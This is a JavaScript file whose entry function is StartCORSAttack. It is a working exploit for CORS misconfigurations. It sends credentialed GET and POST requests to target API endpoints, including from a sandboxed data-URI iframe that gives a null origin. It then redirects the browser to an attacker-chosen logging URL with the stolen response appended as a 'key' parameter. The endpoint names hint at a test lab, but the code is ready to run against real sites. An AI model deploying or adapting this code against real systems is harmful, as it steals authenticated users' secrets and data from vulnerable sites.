function sleep(millis) {
    var t = (new Date()).getTime();
    var i = 0;
    while (((new Date()).getTime() - t) < millis) {
        i++;
    }
}

function CreateCORSForm(url, type, logurl, page){
    var url = url + "/" + page
    var div = document.createElement("div");

    var input = document.createElement("input");
    input.setAttribute("id", type+page+'Button');
    input.setAttribute("type", "checkbox");

    var label = document.createElement("label");
    label.innerHTML = "Send " + type + " request to " + page

    div.appendChild(input);
    div.appendChild(label);

    document.getElementsByTagName("body")[0].appendChild(div);

    button = document.querySelector('#'+type+page+'Button');
    button.addEventListener('click', CorsReq, false);
    
    button.url = url;
    button.logurl = logurl;
    button.reqtype = type;

    return 1;
}

function CorsReq(evt){
    var url = evt.currentTarget.url;
    var type = evt.currentTarget.reqtype;
    var logurl = evt.currentTarget.logurl;
    alert(url, type, logurl);

    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open(type, url, true);

    req.withCredentials = true;
    req.send();

    function reqListener() {
        location=logurl+'?key='+this.responseText;
    };
}




function CorsNullReq(url, type, logurl, page){
    function innerIframe(evt){
        var url = evt.currentTarget.url;
        var type = evt.currentTarget.reqtype;
        var logurl = evt.currentTarget.logurl;
        var page = evt.currentTarget.page;
        console.log(url);
        var elem = document.querySelector('#'+type+page+'ButtonNullP');
        elem.innerHTML = `
            <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
            var req = new XMLHttpRequest();
            req.onload = reqListener;
            req.open('${type}','${url}',true);
            req.withCredentials = true;
            req.send();

            function reqListener() { 
                location='${logurl}?key='+this.responseText;
            };
            </script>">
            </iframe>`;

    } 
    var url = url + "/" + page
    
    var div = document.createElement("div");
    div.setAttribute("id", "iframediv_"+page)

    var input = document.createElement("input");
    input.setAttribute("id", type+page+'ButtonNull');
    input.setAttribute("type", "checkbox");

    var label = document.createElement("label");
    label.innerHTML = "Send " + type + " request to " + page + "[NULL]"

    var p = document.createElement("p")
    p.setAttribute("id", type+page+'ButtonNullP');


    div.appendChild(input);
    div.appendChild(label);
    div.appendChild(p);

    document.getElementsByTagName("body")[0].appendChild(div);

    button = document.querySelector('#'+type+page+'ButtonNull');
    button.addEventListener('click', innerIframe, false);
    
    button.url = url;
    button.logurl = logurl;
    button.reqtype = type;
    button.page = page;
}

function StartCORSAttack(url, logurl){
    var types = ["GET", "POST"];
    var pages = ["api_correct", "api_null", "api_gen", "api_without_creds"]

    for (let i = 0; i < types.length; i += 1) {
        for (let j = 0; j < pages.length; j += 1) {
            if(CreateCORSForm(url, types[i], logurl, pages[j])){
                console.log("Successfully created CORS forms!");
            };
            if(CorsNullReq(url, types[i], logurl, pages[j])){
                console.log("Successfully created CORS NULL iframes")
            }   
    
        }
    }
}

